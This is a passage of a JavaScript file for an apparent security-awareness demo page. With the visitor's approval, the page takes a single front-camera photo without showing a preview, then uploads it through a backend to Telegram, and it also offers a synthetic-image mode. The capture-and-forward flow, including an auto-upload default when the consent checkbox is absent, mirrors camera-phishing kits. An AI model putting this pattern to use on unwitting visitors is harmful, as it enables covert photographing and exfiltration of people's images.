    ctx.strokeStyle = 'rgba(59, 130, 246, 0.4)';
    ctx.strokeRect(45, h - 110, w - 90, 75);

    ctx.fillStyle = '#4ade80';
    ctx.font = 'bold 15px sans-serif';
    ctx.fillText('PRERECORDED SYNTHETIC TEST SAMPLE', w / 2, h - 85);

    ctx.fillStyle = '#94a3b8';
    ctx.font = '12px sans-serif';
    ctx.fillText('Zero hardware camera access • Safe educational artifact', w / 2, h - 62);
  }

  function showDebriefScreen(completionNote) {
    if (screenConsent) screenConsent.style.display = 'none';
    if (screenCapturing) screenCapturing.style.display = 'none';
    if (screenReview) screenReview.style.display = 'none';
    if (screenCancelled) screenCancelled.style.display = 'none';
    if (screenSuccess) screenSuccess.style.display = 'none';
    if (screenDebrief) screenDebrief.style.display = 'block';

    if (debriefPreviewImg && capturedDataUrl) {
      debriefPreviewImg.src = capturedDataUrl;
    }
    if (debriefCompletionMeta && completionNote) {
      debriefCompletionMeta.innerHTML = completionNote;
    }

    sessionStatusBadge.textContent = 'Debrief Active';
    sessionStatusBadge.className = 'badge badge-submitted';
  }

  async function handleSyntheticSimulation() {
    hideCameraError();
    stopCameraTracks();

    try {
      await ensureSessionReady();
    } catch (err) {
      showCameraError(`<strong>Backend Notice:</strong> ${err.message}`, true);
      return;
    }

    // 1. Draw synthetic test image onto cameraCanvas
    drawSyntheticSampleImage(cameraCanvas);

    // 2. Generate Data URL and Blob
    capturedDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.9);
    await new Promise(resolve => {
      cameraCanvas.toBlob(blob => {
        capturedBlob = blob;
        resolve();
      }, 'image/jpeg', 0.9);
    });

    // 3. Record simulation_completed event via non-sensitive telemetry
    await recordAwarenessEvent('simulation_completed', { mode: 'synthetic_sample_image' });

    // 4. Show Awareness Debrief Screen!
    showDebriefScreen('Prerecorded synthetic calibration graphic &bull; Zero hardware camera access');
  }

  // =========================================================================
  // CAMERA EXECUTION: NO LIVE PREVIEW & AUTOMATIC SINGLE CAPTURE
  // =========================================================================

  async function handleStartTest() {
    const isLiveMode = radioModeLive && radioModeLive.checked;
    if (!isLiveMode) {
      await handleSyntheticSimulation();
      return;
    }

    // Live mode execution:
    hideCameraError();
    stopCameraTracks();
    capturedBlob = null;
    capturedDataUrl = null;

    // Check secure context (HTTPS)
    if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
      showCameraError(
        '<strong>HTTPS Required:</strong> Web browsers strictly require a secure HTTPS connection to access camera hardware. ' +
        'Please access this demonstration via HTTPS.',
        false
      );
      return;
    }

    // Check MediaDevices support
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      showCameraError(
        '<strong>Unsupported Browser:</strong> Your current browser does not support the Web MediaDevices API. ' +
        'You can still run the test using the Safe Simulation (Sample Test Image) mode above.',
        false
      );
      return;
    }

    const shouldAutoUpload = consentUploadCheckbox ? consentUploadCheckbox.checked : true;

    // Ensure session is active
    try {
      await ensureSessionReady();
    } catch (err) {
      showCameraError(`<strong>Backend Notice:</strong> ${err.message}`, true);
      return;
    }

    // Record interaction
    recordAwarenessEvent('demo_button_clicked', { source: 'live_camera_start_button' });

    // Transition to capturing screen (NO LIVE PREVIEW SHOWN!)
    screenConsent.style.display = 'none';
    if (screenReview) screenReview.style.display = 'none';
    if (screenDebrief) screenDebrief.style.display = 'none';
    screenCapturing.style.display = 'block';

    capturingTitle.textContent = 'Requesting Camera Access...';
    capturingDesc.textContent = 'Please approve the browser prompt. In accordance with requirements, no live video preview will be displayed.';

    try {
      // 1. Request camera stream via standard browser permission mechanism
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      });

      activeStream = stream;
      cameraVideo.srcObject = stream;

      capturingTitle.textContent = 'Capturing Demonstration Photo...';
      capturingDesc.textContent = 'Automatically taking one photo. Camera hardware will be disconnected immediately.';

      // 2. Wait for camera video element to receive video data
      await new Promise((resolve) => {
        if (cameraVideo.readyState >= 2 && cameraVideo.videoWidth > 0) {
          resolve();
        } else {
          cameraVideo.onloadedmetadata = () => resolve();
          setTimeout(resolve, 800);
        }
      });

      // Allow 400ms for hardware auto-exposure / white-balance stabilization
      await new Promise(r => setTimeout(r, 400));

      // 3. Automatically capture ONE photo onto the canvas
      const vw = cameraVideo.videoWidth || 640;
      const vh = cameraVideo.videoHeight || 480;
      cameraCanvas.width = vw;
      cameraCanvas.height = vh;

      const ctx = cameraCanvas.getContext('2d');
      // Mirror horizontally for natural selfie view
      ctx.translate(vw, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(cameraVideo, 0, 0, vw, vh);

      // 4. CRITICAL: Stop all camera tracks IMMEDIATELY after capture!
      stopCameraTracks();

      // 5. Generate image Blob & data URL from canvas
      capturedDataUrl = cameraCanvas.toDataURL('image/jpeg', 0.88);
      await new Promise(resolve => {
        cameraCanvas.toBlob((blob) => {
          capturedBlob = blob;
          resolve();
        }, 'image/jpeg', 0.88);
      });

      // 6. If visitor explicitly agreed to upload upfront, transmit automatically now!
      if (shouldAutoUpload) {
        capturingTitle.textContent = 'Transmitting to Telegram...';
        capturingDesc.textContent = 'Delivering snapshot to demonstration Telegram destination...';
        await transmitToTelegram();
        await recordAwarenessEvent('simulation_completed', { mode: 'live_camera_authorized', uploaded: true });
        showDebriefScreen('Demonstration snapshot captured & delivered to Telegram &bull; Hardware disconnected immediately');
      } else {
        // Otherwise show review confirmation screen
        screenCapturing.style.display = 'none';
        screenReview.style.display = 'block';
        sessionStatusBadge.textContent = 'Snapshot Captured';
        sessionStatusBadge.className = 'badge badge-opened';
      }

    } catch (err) {
      console.error('[Demo] Camera error:', err);
      stopCameraTracks();
      handleCameraPermissionError(err);
    }
  }

  function handleCameraPermissionError(err) {
    screenCapturing.style.display = 'none';
    screenConsent.style.display = 'block';

    let errorMsg = 'An unexpected error occurred while requesting camera access.';

    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
      errorMsg = '<strong>Camera Permission Denied:</strong> Your browser or operating system blocked camera access.' +
                 '<br><br><strong>How to continue without camera:</strong>' +
                 '<p style="margin: 0.5rem 0; font-size: 0.85rem;">You can return to the video landing page to learn about browser permissions without using the camera on your device.</p>' +
                 '<strong>To enable camera permissions:</strong>' +
                 '<ul style="margin: 0.5rem 0 0.5rem 1.25rem; font-size: 0.825rem;">' +
                 '<li><strong>iPhone / iPad Safari:</strong> Tap the &quot;aA&quot; or website settings icon in the address bar &rarr; Website Settings &rarr; Camera &rarr; Allow.</li>' +
                 '<li><strong>Android Chrome:</strong> Tap the lock or tune icon beside the URL &rarr; Permissions &rarr; Camera &rarr; Allow.</li>' +
                 '<li><strong>Desktop Browsers:</strong> Click the camera or lock icon on the address bar and select &quot;Allow&quot;.</li>' +
                 '</ul>';
    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
      errorMsg = '<strong>No Camera Hardware Detected:</strong> No camera was found on this device.';
    } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
      errorMsg = '<strong>Camera Busy:</strong> The camera is currently being used by another application or tab.';
    }

    showCameraError(errorMsg, true);
  }

  function showCameraError(htmlMessage, showRetry = false) {
    if (!cameraErrorContainer) return;
    cameraErrorContainer.style.display = 'block';
    cameraErrorContainer.innerHTML = `
      <div class="notice notice-danger">
        <div style="flex: 1;">
          <div>${htmlMessage}</div>
          ${showRetry ? `
            <div style="margin-top: 0.75rem;">
              <button type="button" id="btn-retry-camera" class="btn btn-secondary btn-sm">
                🔄 Try Again
              </button>
            </div>
          ` : ''}
        </div>
      </div>
    `;

    if (showRetry) {
      const retryBtn = document.getElementById('btn-retry-camera');
      if (retryBtn) {
        retryBtn.addEventListener('click', handleStartTest);
      }
    }
  }

  function hideCameraError() {
    if (!cameraErrorContainer) return;
    cameraErrorContainer.style.display = 'none';
    cameraErrorContainer.innerHTML = '';
  }

  function stopCameraTracks() {
    if (activeStream) {
      activeStream.getTracks().forEach(track => {
        try {
          track.stop();
        } catch (e) {}
      });
      activeStream = null;
    }
    if (cameraVideo) {
      cameraVideo.srcObject = null;
    }
  }

  // =========================================================================
  // SUBMISSION TO TELEGRAM (AFTER EXPLICIT AGREEMENT)
  // =========================================================================

  async function handleConfirmUpload() {
    await transmitToTelegram();
    await recordAwarenessEvent('simulation_completed', { mode: 'live_camera_authorized', uploaded: true });
    showDebriefScreen('Demonstration snapshot confirmed & delivered to Telegram &bull; Hardware disconnected immediately');
  }

  async function transmitToTelegram() {
    if (!capturedBlob) {
      showCameraError('No snapshot available to upload. Please retake photo.', true);
      return;
    }

    const targetSessionId = await ensureSessionReady();
    const apiUrl = window.APP_CONFIG.getApiBaseUrl();

    if (btnConfirmUpload) {
      btnConfirmUpload.disabled = true;
      btnConfirmUpload.innerHTML = '<span class="spinner"></span> Transmitting to Telegram...';
    }

    try {
      const formData = new FormData();
      formData.append('photo', capturedBlob, `demo-${targetSessionId.substring(0, 8)}.jpg`);

      const response = await fetch(`${apiUrl}/api/sessions/${targetSessionId}/photo`, {
        method: 'POST',
        headers: { 'Accept': 'application/json' },
        body: formData
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || `HTTP ${response.status}: Delivery failed`);
      }

      // Show Debrief Screen
      if (screenCapturing) screenCapturing.style.display = 'none';
      if (screenReview) screenReview.style.display = 'none';
      showDebriefScreen('Demonstration snapshot captured & delivered to Telegram &bull; Hardware disconnected immediately');

    } catch (err) {
      console.error('[Demo] Transmission failure:', err);
      if (screenCapturing) screenCapturing.style.display = 'none';
      if (screenReview) screenReview.style.display = 'block';
      showCameraError(`Failed to transmit photo: ${err.message}`, true);
      if (btnConfirmUpload) {
        btnConfirmUpload.disabled = false;
        btnConfirmUpload.innerHTML = '<span>🚀 Confirm & Submit to Telegram</span>';
      }
    }
  }

  function handleCancelDemo() {
    stopCameraTracks();
    capturedBlob = null;
    capturedDataUrl = null;
    screenConsent.style.display = 'none';
    if (screenCapturing) screenCapturing.style.display = 'none';
    if (screenReview) screenReview.style.display = 'none';
    screenCancelled.style.display = 'block';

    sessionStatusBadge.textContent = 'Cancelled';
    sessionStatusBadge.className = 'badge badge-revoked';
  }

  // Run on DOM Ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
